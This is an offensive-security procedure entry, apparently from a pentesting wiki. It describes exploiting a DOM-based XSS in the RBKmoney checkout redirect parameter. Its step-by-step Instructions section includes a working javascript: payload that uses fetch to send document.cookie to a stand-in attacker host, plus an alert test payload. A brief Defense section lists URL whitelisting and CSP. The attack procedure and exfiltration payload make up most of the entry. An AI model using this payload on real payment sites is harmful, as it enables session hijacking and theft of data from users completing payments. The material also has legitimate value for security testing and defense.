---
id: proc-uuid-001
name: Inject-Malicious-JavaScript-via-Redirect-URL
tags:
  - xss
  - dom-xss
  - javascript-url
  - redirect
  - checkout
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:30.565Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-JavaScript-via-Redirect-URL

## Summary

This procedure exploits a DOM-based XSS vulnerability in web application redirect URLs by injecting a 'javascript:' URL scheme, leading to arbitrary code execution in the victim's browser after a successful payment or checkout process. It targets insufficient input validation in redirect parameters, allowing theft of session cookies or other client-side data.

## Description

In the RBKmoney application, the redirect URL during invoice checkout is not properly sanitized, permitting the 'javascript:' protocol. An attacker crafts a malicious redirect URL, such as one that executes JavaScript to exfiltrate cookies to a remote server. When the victim completes the payment, the application redirects using the tainted URL, executing the payload in the browser's context. This is a DOM-based XSS as the vulnerability occurs client-side during URL processing. Prerequisites include access to initiate a checkout and victim interaction to trigger the redirect.

## Requirements

1. Web browser or proxy tool for request interception and modification
2. Attacker-controlled server to receive exfiltrated data (e.g., for fetch requests)
3. Valid invoice or checkout session in the target application
4. HTTPS access to the payment endpoint

## Defense

Defensive measures and detection strategies:

- Implement strict URL validation to whitelist only safe protocols (e.g., http/https) and domains for redirects
- Use Content Security Policy (CSP) to restrict inline JavaScript execution
- Server-side logging of redirect URLs for anomaly detection (e.g., unusual protocols)
- Client-side escaping of URL parameters before DOM insertion

## Objectives

1. Inject and execute arbitrary JavaScript in the victim's browser
2. Steal sensitive data like session cookies or local storage
3. Demonstrate impact of unsanitized redirect handling in payment flows

## Instructions

### Step 1: Identify and Intercept Checkout Request

**Context**: Locate the redirect URL parameter in the checkout or invoice payment form. Use a proxy to capture and modify the request.

Intercept the payment initiation request using [[tools/Burp-Suite]] or browser dev tools. Look for parameters like `redirect_url` or `return_url` in the POST or GET data.

### Step 2: Craft and Inject Payload

**Context**: Replace the legitimate redirect URL with a malicious 'javascript:' payload to execute code post-payment.

Modify the parameter to: `redirect_url=javascript:fetch('https://attacker.com/log?data='+encodeURIComponent(document.cookie));`. This sends cookies to the attacker's server upon execution.

For testing, use a simple alert: `redirect_url=javascript:alert('XSS');`.

### Step 3: Trigger Execution

**Context**: Complete the payment flow to invoke the redirect and execute the payload.

Submit the modified request and simulate or perform a successful invoice payment. Observe the browser redirecting and executing the JavaScript, confirming the vulnerability.

**Expected Output**: Network request to attacker server with stolen data or an alert popup displaying cookies.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[xss]]
- [[dom-xss]]
- [[javascript-url]]
- [[redirect]]
- [[checkout]]
